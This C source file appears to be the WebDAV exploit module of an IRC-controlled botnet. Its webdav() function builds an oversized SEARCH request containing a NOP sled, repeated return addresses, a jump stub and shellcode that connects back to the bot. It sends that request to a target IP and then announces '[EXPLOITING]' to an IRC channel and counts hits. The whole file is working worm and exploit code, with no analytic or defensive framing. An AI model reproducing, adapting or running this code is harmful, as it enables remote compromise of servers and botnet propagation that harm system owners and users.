#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_WEBDAV

char jumpcode[] = "\x8b\xf9\x32\xc0\xfe\xc0\xf2\xae\xff\xe7";

char body[] =
	"<?xml version=\"1.0\"?>\r\n<g:searchrequest xmlns:g=\"DAV:\">\r\n"
	"<g:sql>\r\nSelect \"DAV:displayname\" from scope()\r\n</g:sql>\r\n"
	"</g:searchrequest>\r\n";

BOOL webdav(EXINFO exinfo)
{
	SOCKET sSocket;;
	if ((sSocket = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == SOCKET_ERROR) 
		return FALSE;

	SOCKADDR_IN ssin; 
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET; 
	ssin.sin_port = fhtons((unsigned short)exinfo.port);
	ssin.sin_addr.s_addr = finet_addr(exinfo.ip);

	char buffer[IRCLINE], scbuf[4096]; 
	char *reqbuf = (char*)malloc(100000), *sc = (char *)malloc(4096);

	unsigned short ret = 0xB102;
	int iPos = 0, scbufsize = 0, reqbufsize = 0, iNOPSize = 100, rt = 0, r = 0;

	DWORD scsize = GetRNS0TerminatedShellcode(sc, 4096, GetIP(exinfo.sock), filename);
	if (!scsize) {
		free(reqbuf);
		free(sc);
		fclosesocket(sSocket);
		return FALSE;
	}

	// Build a buffer with the shellcode
	memset(scbuf+iPos, '\x90', iNOPSize); 
	iPos += iNOPSize;
	memcpy(scbuf+iPos, sc,     scsize  ); 
	iPos += scsize;
	scbufsize = iPos; iPos = 0;

	// Build the request
	memset(reqbuf, 0, 100000);
	strcpy(reqbuf, "SEARCH /");
	DWORD j, i = strlen(reqbuf); 
	reqbuf[i] = '\x90';

	for(j=i+1; j<i+2150; j+=2) { 
		memcpy(reqbuf+j, &ret, 2);				
		iPos+=2; 
	}			// EIP will be buffer[8+2087]
	for(;j<i+65535-strlen(jumpcode);j++) 
		reqbuf[j] = '\x90';		// The rest is padded with NOP's. RET address should point to this zone!
	memcpy(reqbuf+j, jumpcode, strlen(jumpcode));													// Then we skip the body of the HTTP request

	strcat(reqbuf, " HTTP/1.1\r\n");
	sprintf(reqbuf+strlen(reqbuf), "Host: %s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n", exinfo.ip, strlen(body)+scsize);
	strcat(reqbuf, body);
	memset(reqbuf+strlen(reqbuf), 0x01, 1);
	memset(reqbuf+strlen(reqbuf), 0x90, 3);
	memcpy(reqbuf+strlen(reqbuf), scbuf, scsize);
	reqbufsize = strlen(reqbuf);

	// send request packet
	if (fsend(sSocket, reqbuf, reqbufsize, 0) == SOCKET_ERROR) {
		free(reqbuf); 
		free(sc);
		fclosesocket(sSocket);
		return FALSE;
	}

	// read reply (abuse request buffer)
	frecv(sSocket, reqbuf, 5000, 0);

	// clean up & bye
	free(reqbuf); 
	free(sc);
	fclosesocket(sSocket);

	_snprintf(buffer, sizeof(buffer), "%s// [EXPLOITING] IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
	if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
	addlog(buffer);
	exploit[exinfo.exploit].stats++;

	return TRUE;
}
#endif